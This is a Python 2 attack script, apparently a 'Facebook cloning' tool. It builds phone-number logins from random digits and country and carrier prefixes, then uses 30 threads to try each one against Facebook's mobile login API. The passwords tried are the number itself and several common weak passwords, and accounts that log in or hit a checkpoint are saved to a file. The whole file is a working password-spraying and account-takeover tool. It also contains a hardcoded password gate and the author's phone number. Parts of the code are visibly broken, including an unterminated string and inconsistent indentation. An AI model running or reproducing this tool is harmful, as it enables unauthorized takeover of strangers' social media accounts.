#CYBER NAME BLACK-KILLER
#GITHUB: https://github.com/ShuBhamg0sain
#WHATAPP NO +919557777030
import os
CorrectUsername = "g0sain"
CorrectPassword = "sim"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[#] \x1b[0;36m Enter Username\x1b[1;92m➤ ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[#] \x1b[0;36m Enter Password\x1b[1;92m➤ ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #fb-cloning-id SG
            loop = 'false'
        else:
            print "Wrong password!"
            os.system('xdg-open https://www.instagram.com/shubham_g0sain/?hl=en')
    else:
        print "Wrong username!"
        os.system('xdg-open https://www.instagram.com/shubham_g0sain/?hl=en')
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(100000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('login.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')
##### LOGO #####
logo='''
\033[1;96m•◈•───────────────•◈•\033[1;92mShuBhamg0sain\033[1;96m•◈•───────────────•◈•
\033[1;97m	                                    
\033[1;97m                      :::!~!!!!!:. 
\033[1;97m                  .xUHWH!! !!?M88WHX:.
\033[1;97m                .X*#M@$!!  !X!M$$$$$$WWx:.
\033[1;97m               :!!!!!!?H! :!$!$$$$$$$$$$8X:
\033[1;97m              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
\033[1;97m             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
\033[1;91m             ~!~!!!! .: BLACK-KILLER$$$$RMM!
\033[1;97m               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
\033[1;97m               ~?WuxiW*`   `"#$$$$8!!!!??!!!
\033[1;97m             :X- M$$$$       `"T#$T~!8$WUXU~
\033[1;97m            :%`  ~#$$$m:        ~!~ ?$$$$$$
\033[1;97m          :!`.-   ~T$$$$8xx.  .xWW- ~""##*" 
\033[1;97m.....   -~~\033[1;91m:<` !    ~?T#$$@@W@*?$$      /`
\033[1;97mW$@@M!!! .!~~ \033[1;91m!!     .:XUW$W!~ `"~:    :
\033[1;97m#"~~`.:x%`!!  \033[1;91m!H:   !WM$$$$Ti.: .!WUn+!`
\033[1;97m:::~:!!`:X~ .:\033[1;92m ?H.!u "$$$B$$$!W:U!T$$M~
\033[1;97m.~~   :X@!.-~   \033[1;92m?@WTWo("*$$$W$TH$! `
\033[1;97mWi.~!X$?!-~    : \033[1;92m?$$$B$Wu("**$RM!
\033[1;97m$R@i.~~ !     :   \033[1;92m~$$$$$B$$en:``    
\033[1;97m?MXT@Wx.~    :     \033[1;92m~"##*$$$$M~   
\033[1;47m                  \033[1;31mShuBhamg0sain                \033[1;0m
\x1b[1;93m--------------------------------------------------------------
\x1b[1;92m➣  NAME  : Shubhamg0sain
\x1b[1;91m➣  CYBER NAME : BLACK-KILLER
\x1b[1;93m➣  WHATSAPP NO     : +919557777030
\x1b[1;95m➣  WARNING  : DON,T CALL ME ONLY TEXT
\x1b[1;97m➣  NOTE     : USE FAST 4G SIM NET
\x1b[1;93m--------------------------------------------------------------
back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
        print logo
        print "\033[1;96m⊱⋕⊰══════════════════════════════════════════════⊱⋕⊰\n"
        print '\033[1;94m[1]\033[1;96m  Bangladesh   \033[1;94m[7]\033[1;96m  Korea'
        print '\033[1;94m[2]\033[1;93m  USA          \033[1;94m[8]\033[1;93m  Italy'
        print '\033[1;94m[3]\033[1;96m  UK           \033[1;94m[9]\033[1;96m  Spain'
        print '\033[1;94m[4] \033[1;93m India        \033[1;94m[10]\033[1;93m Poland'
        print '\033[1;94m[5]\033[1;96m  Brazil       \033[1;94m[11]\033[1;96m Pakistan'
        print '\033[1;94m[6]\033[1;93m  Japan        \033[1;94m[12]\033[1;93m Indonisia'
        print '\033[1;94m[13]\033[1;91m Update XP-TRICKER'
        print '[0]\033[1;97m  Exit'
        print "\033[1;96m⊱⋕⊰══════════════════════════════════════════════⊱⋕⊰\n"

    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\033[1;91m>>>  ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199'
        try:
            c = raw_input('\x1b[1;96m choose code  : ')
            k = '+880'
            idlist = 'login.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '2':
        os.system('clear')
        print logo
        print '786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708'
        try:
            c = raw_input(' choose code  : ')
            k = '+1'
            idlist = 'login.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '3':
        os.system('clear')
        print logo
        print '737, 706, 748, 783, 739, 759, 790'
        try:
            c = raw_input(' choose code  : ')
            k = '+44'
            idlist = 'login.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '4':
        os.system('clear')
        print (logo)
        print("953, 955, 962, 900, 919, 993, 993, 955, 962, 965, 969, 979, 995, 979, 918, 944, 944, 949, 949, 949, 949, 949")
        print("800, 812, 817, 817, 817, 840, 875, 885, 895, 833, 833, 833, 850, 898")
        print("738, 760, 789, 775, 738")
        try:
            c = raw_input(' choose code  : ')
            k = '+91'
            idlist = 'login.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '5':
        os.system('clear')
        print logo
        print '127, 179, 117, 853, 318, 219, 834, 186, 479, 113'
        try:
            c = raw_input(' choose code  : ')
            k = '+55'
            idlist = 'login.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '6':
        os.system('clear')
        print logo
        print '11, 12, 19, 16, 15, 13, 14, 18, 17'
        try:
            c = raw_input(' choose code  : ')
            k = '+81'
            idlist = 'login.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '7':
        os.system('clear')
        print logo
        print '1, 2, 3, 4, 5, 6, 7, 8, 9'
        try:
            c = raw_input(' choose code  : ')
            k = '+82'
            idlist = 'login.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '8':
        os.system('clear')
        print logo
        print '388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328'
        try:
            c = raw_input(' choose code  : ')
            k = '+39'
            idlist = 'login.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '9':
        os.system('clear')
        print logo
        print '60, 76, 73, 64, 69, 77, 65, 61, 75, 68'
        try:
            c = raw_input(' choose code  : ')
            k = '+34'
            idlist = 'login.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '10':
        os.system('clear')
        print logo
        print '66, 69, 78, 79, 60, 72, 67, 53, 51'
        try:
            c = raw_input(' choose code  : ')
            k = '+48'
            idlist = 'login.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '11':
        os.system('clear')
        print logo
        print '\x1b[1;93m01, ~to~~, 49'
        try:
            c = raw_input(' choose code  : ')
            k = '03'
            idlist = 'login.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '12':
        os.system('clear')
        print logo
        print '\x1b[1;93m81,83,85,84,89,'
        try:
            c = raw_input(' choose code  : ')
            k = '+1'
            idlist = 'login.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '13':
        os.system('xdg-open https://www.youtube.com')
        login()
    elif bch == '0':
        exb()
    else:
        print '[!] Fill in correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
    time.sleep(0.5)
    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m Please wait, process is running ...')
    time.sleep(0.5)
    psb('[!] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    print

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;32mBlACk-KILLER-HACK ' + k + c + user + '  |  ' + pass1
                okb = open('login.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass1
                cps = open('login.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '786786'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;32mBlACk-KILLER-HACK ' + k + c + user + '  |  ' + pass2
                    okb = open('login.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass2
                    cps = open('login.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '000786'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;32mBlACk-KILLER-HACK  ' + k + c + user + '  |  ' + pass3
                        okb = open('login.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass3
                        cps = open('login.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = '123456'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;32mBlACk-KILLER-HACK ' + k + c + user + '  |  ' + pass4
                            okb = open('login.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass4
                            cps = open('login.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = '786786786'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32mBlACk-KILLER-HACK ' + k + c + user + '  |  ' + pass5
                                okb = open('login.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass5
                                cps = open('login.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰"
    print '[✓] Process Has Been Completed ....'
    print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
    print('[✓] CP File Has Been Saved : save/checkpoint.txt')
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 S.py')


if __name__ == '__main__':
    menu()
